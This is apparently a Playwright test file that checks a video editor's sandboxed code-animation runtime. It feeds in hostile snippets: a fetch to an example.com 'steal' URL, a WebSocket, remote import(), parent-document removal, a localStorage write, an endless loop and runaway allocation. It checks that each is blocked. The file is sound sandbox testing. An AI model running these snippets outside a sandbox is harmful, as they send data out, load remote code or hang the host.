import { readFileSync } from 'node:fs';
import type { Page } from '@playwright/test';
import { test, expect, hook, menuAction, showCategory } from './fixtures';

// X5 (CODE-TIERS-SPEC sections 4 and 6): hostile or heavy free code in the
// real sandboxed runtime, and a code template across a reload.
const dialog = (page: Page) => page.locator('.code-import-dialog');
const meta = (duration = 1, fps = 10) =>
  `meta: { "id": "probe", "name": "Probe", "version": "1.0.0", "category": "Test", "duration": ${duration}, "fps": ${fps}, "seekable": false, "keepFrame": false, "thumbnailTime": 0, "libs": [], "params": [] }`;
const free = (body: string, duration = 1, fps = 10) =>
  `export default {\n  ${meta(duration, fps)},\n  init({ ctx }) { this.ctx = ctx; },\n  renderFrame({ t }) {\n    ${body}\n    this.ctx.fillStyle = '#ff0000';\n    this.ctx.fillRect(0, 0, 10 + t * 100, 10);\n  },\n};\n`;
const codeDebug = async (page: Page) =>
  page.evaluate(
    () =>
      (
        window as unknown as {
          __AIVE__: {
            getMedia(): {
              code: {
                state: string;
                stored: number;
                total: number;
                error: string | null;
              }[];
            };
          };
        }
      ).__AIVE__.getMedia().code,
  );
async function openImport(page: Page) {
  await showCategory(page, 'Media');
  await showCategory(page, 'AI');
  await page.locator('#ai-import').click();
  await expect(dialog(page)).toBeVisible();
}
async function newProject(page: Page) {
  await menuAction(page, '#new-project');
  const form = page.getByRole('dialog', { name: 'New project' });
  await form.getByLabel('Resolution', { exact: true }).selectOption('720p');
  await page
    .getByRole('button', { name: 'Create project', exact: true })
    .click();
  await page.locator('.modal-dialog [data-role="confirm"]').click();
  await expect
    .poll(async () => (await hook(page)).project.compositions[0]!.layers.length)
    .toBe(0);
}
/** Requests that left this origin (there must be none). */
function outside(page: Page) {
  const seen: string[] = [];
  page.on('request', (request) => {
    const url = new URL(request.url());
    // blob: and data: URLs are made by the page itself.
    if (!/^(https?|wss?):$/.test(url.protocol)) return;
    if (!['127.0.0.1', 'localhost'].includes(url.hostname)) seen.push(url.href);
  });
  return seen;
}

test.describe('X5 hostile and heavy free code', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/');
    await expect
      .poll(async () => page.evaluate(() => '__AIVE__' in window))
      .toBe(true);
  });

  test('[CODE-012] network, parent access, storage and import() are refused with a message; the editor is untouched', async ({
    page,
  }) => {
    const requests = outside(page);
    const storage = await page.evaluate(() => JSON.stringify(localStorage));
    const project = (await hook(page)).project;
    await openImport(page);
    for (const body of [
      "fetch('https://example.com/steal');",
      "new WebSocket('wss://example.com');",
      'parent.document.body.remove();',
      "localStorage.setItem('owned', '1');",
      "import('https://example.com/x.js');",
    ]) {
      await dialog(page).locator('#ai-import-source').fill(free(body));
      await expect(dialog(page).locator('#code-errors li').first()).toHaveText(
        /^Line \d+: .* Fix: /,
      );
      await expect(dialog(page).locator('#ai-import-add')).toBeDisabled();
    }
    await dialog(page).locator('#ai-import-cancel').click();
    expect(requests).toEqual([]);
    expect(await page.evaluate(() => JSON.stringify(localStorage))).toBe(
      storage,
    );
    expect((await hook(page)).project).toEqual(project);
    await expect(page.locator('#composition-canvas')).toBeVisible();
  });

  test('[CODE-012] an endless loop and unbounded allocation stop with a clear message, and nothing else breaks', async ({
    page,
  }) => {
    const requests = outside(page);
    await newProject(page);
    for (const [body, message] of [
      ['while (true) {}', /budget|timeout/i],
      [
        'const hoard = []; for (;;) hoard.push(new Array(1000000).fill(1));',
        /budget|allocation|memory|timeout/i,
      ],
    ] as const) {
      await openImport(page);
      await dialog(page).locator('#ai-import-source').fill(free(body));
      // It may pass the static check; running it is stopped, so the
      // thumbnail fails with the runtime's message.
      await expect(dialog(page).locator('#code-error')).toHaveText(message, {
        timeout: 60_000,
      });
      await dialog(page).locator('#ai-import-cancel').click();
      await expect(dialog(page)).toBeHidden();
    }
    // No sandbox is left behind, and the runtime still renders valid code.
    await expect(page.locator('iframe[sandbox]')).toHaveCount(0);
    await openImport(page);
    await dialog(page).locator('#ai-import-source').fill(free(''));
    await expect(dialog(page).locator('#code-thumb')).toHaveAttribute(
      'data-ready',
      'true',
      { timeout: 60_000 },
    );
    await dialog(page).locator('#ai-import-cancel').click();
    expect((await hook(page)).project.compositions[0]!.layers).toEqual([]);
    expect(requests).toEqual([]);
  });

  test('[CODE-012] a heavy bake shows its progress and can be cancelled; the sandbox is removed', async ({
    page,
  }) => {
    await newProject(page);
    await openImport(page);
    // About 900,000 loop steps a frame (under the runtime's budget), 300
    // frames.
    await dialog(page)
      .locator('#ai-import-source')
      .fill(
        free(
          'let s = 0; for (let i = 0; i < 900000; i++) s += Math.sqrt(i); this.s = s;',
          10,
          30,
        ),
      );
    await expect(dialog(page).locator('#code-tier')).toHaveText(
      'Tier C · Full mode',
      { timeout: 60_000 },
    );
    await expect(dialog(page).locator('#code-thumb')).toHaveAttribute(
      'data-ready',
      'true',
      { timeout: 60_000 },
    );
    await dialog(page).locator('#ai-import-add').click();
    const bar = page.locator('.timeline-clip[data-code="true"] .clip-bake');
    await expect(bar.locator('.clip-bake-label')).toHaveText(/Rendering \d+ %/);
    await expect
      .poll(async () => (await codeDebug(page))[0]!.stored, { timeout: 60_000 })
      .toBeGreaterThan(3);
    await bar.locator('.clip-bake-action').click();
    await expect(bar).toHaveAttribute('data-state', 'cancelled');
    const state = (await codeDebug(page))[0]!;
    expect(state.state).toBe('cancelled');
    expect(state.stored).toBeLessThan(state.total);
    await expect(page.locator('iframe[sandbox]')).toHaveCount(0);
  });

  test('[CODE-013] a saved code template survives a reload and renders in a new project', async ({
    page,
  }) => {
    await openImport(page);
    await dialog(page)
      .locator('#ai-import-source')
      .fill(readFileSync('src/freecode/samples/chart.txt', 'utf8'));
    await expect(dialog(page).locator('#code-thumb')).toHaveAttribute(
      'data-ready',
      'true',
      { timeout: 60_000 },
    );
    await dialog(page).locator('#ai-import-add').click();
    await expect(dialog(page)).toBeHidden();
    await page.reload();
    await expect
      .poll(async () => page.evaluate(() => '__AIVE__' in window))
      .toBe(true);
    await newProject(page);
    // FX10: a new project is fresh; the animation comes by import.
    await showCategory(page, 'AI');
    await page.locator('#ai-import-library').click();
    await page
      .locator('.import-dialog [data-role="ai-import-all"]')
      .first()
      .click();
    await page
      .locator('.import-dialog [data-role="ai-import-confirm"]')
      .click();
    // R2: a code animation is kept in AI › Motion.
    const card = page.locator(
      '#library-ai .ai-group[data-kind="motion"] .ai-card',
    );
    await expect(card).toHaveCount(1);
    await card.click();
    await expect
      .poll(async () => (await codeDebug(page))[0]?.state, { timeout: 240_000 })
      .toBe('done');
    const layer = (await hook(page)).project.compositions[0]!.layers.find(
      (l) => l.code,
    )!;
    expect(layer.code!.tier).toBe('C');
    expect(layer.code!.source).toContain('export default');
    // The chart is drawn: the artboard holds pixels other than its white.
    await page.locator('.player-timecode').click();
    await page.keyboard.type('3');
    await page.keyboard.press('Enter');
    const coloured = await page.evaluate(() => {
      const canvas = document.querySelector<HTMLCanvasElement>(
        '#composition-canvas',
      )!;
      const data = canvas
        .getContext('2d')!
        .getImageData(0, 0, canvas.width, canvas.height).data;
      let count = 0;
      for (let i = 0; i < data.length; i += 4)
        if (
          Math.max(data[i]!, data[i + 1]!, data[i + 2]!) -
            Math.min(data[i]!, data[i + 1]!, data[i + 2]!) >
          40
        )
          count++;
      return count;
    });
    expect(coloured).toBeGreaterThan(500);
  });
});
